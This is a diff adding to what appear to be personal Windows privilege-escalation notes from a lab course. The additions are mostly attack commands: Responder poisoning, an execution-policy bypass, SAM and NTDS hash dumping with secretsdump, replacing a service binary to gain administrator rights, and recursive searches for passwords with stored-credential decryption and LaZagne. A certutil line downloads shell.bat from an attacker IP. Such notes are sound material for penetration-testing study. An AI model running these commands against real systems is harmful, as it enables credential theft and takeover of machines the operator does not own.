@@ -10,6 +10,7 @@ $ netstat -ano
 $ query user
 $ echo %USERNAME%
 $ whoami /priv
+$ whoami /user
 $ whoami /groups
 $ net user
 $ net localgroup
@@ -20,6 +21,10 @@ $ Get-MpComputerStatus
 $ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 $ Get-Hotfix | ft -Autosize
 $ sc qc AppReadiness
+$ sudo responder -wrf -v -I tun0
+$ schtasks /query /fo LIST /v
+$ Get-ScheduledTask | select TaskName,State
+$ Set-ExecutionPolicy bypass -Scope process
 
 * Log Reader
 $ net localgroup "Event Log Readers"
@@ -32,6 +37,31 @@ What is the active directory domain name?
 What is the hostname of the computer being taken over?
 How many users are there in the domain and which user names have been hashed?
 
+* Kernel exploits
++ MS08-067 -> RCE
++ MS17-010 -> EternalBlue RCE
++ ALPC Taks Scheduler 0day -> RCE
++ CVE-2021-36934 HiveNightmare
+> Checking SAM
+$ icacls c:\windows\system32\config\SAM
+$ impacket-secretdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-08-07 local
++ CVE-2021-1675 PrintNightmare -> SeLoadDrivierPrivilege
+
+* Vulnerable Services
+enum : 
+$ wmic product get name
+$ netstat -ano | findstr 6064 -> local port
+$ get-service | ? {$_.DisplayName -like 'Druva*'} -> example running service
+
+* Weak Permission
+$ .\SharpUp.exe audit -> for ex [SecurityService, WindscribeService, Unquited Service]
+Check Permission:
+$ icacls "path\SecurityService.exe" -> show Everyone and BUILTIN\Users,
+$ accesschk.exe /accpteula -quvcw [package]
+Replacing Service Binary
+$ cmd /c copy /Y SecurityService.exe "path\SecurityService.exe"
+$ sc start SecurityService
+$ net localgroup administrators
 
 * Powershell && PowerUp Enumeration:
 PS C:\Temp> add user to near domain local
@@ -83,7 +113,6 @@ $ Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,d
 
 * SeLoadDriverPrivilege
 
-
 $ Import-Module .\SeBackupPrivilegeUtils.dll
 $ Import-Module .\SeBackupPrivilegeCmdLets.dll
 $ Get-SeBackupPrivilege
@@ -97,6 +126,32 @@ $ $key = Get-BootKey -SystemHivePath .\SYSTEM
 $ Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
 $ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 $ robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+
+* Credential Theft
+$ findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+$ cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
+$ findstr /si password *.xml *.ini *.txt *.config
+$ findstr /spin "password" *.*
+$ select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
+$ dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+$ where /R C:\ *.config
+$ Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
+$ gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
+$ C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt
+$ (Get-PSReadLineOption).HistorySavePath)
+$ gc (Get-PSReadLineOption).HistorySavePath
+Decrypt:
+$ $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
+$ $credential.GetNetworkCredential().username
+$ $credential.GetNetworkCredential().password
+$ reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+using Lasagne:
+$ .\lasagne.exe all
+
+* Certutil
+$ certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
+$ certutil -encode file1 encodedfile
+$ certutil -decode encodedfile file2
 
 
 * Bloodhound Checks:
